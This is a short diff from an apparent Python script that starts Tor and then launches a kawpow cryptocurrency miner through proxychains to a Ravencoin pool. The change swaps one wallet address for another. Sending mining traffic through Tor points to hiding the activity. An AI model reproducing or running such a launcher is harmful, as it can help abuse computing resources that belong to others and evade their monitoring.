@@ -33,4 +33,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --algo kawpow --server rvn.2miners.com:16060 --user RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx.ml -p x --ssl 1 ' )
+os.system ('proxychains4 ' + program + ' --algo kawpow --server rvn.2miners.com:16060 --user RPebrS7sKNBetCdw3xE1HJiAuv1S1T7uEo.px -p x --ssl 1 ' )
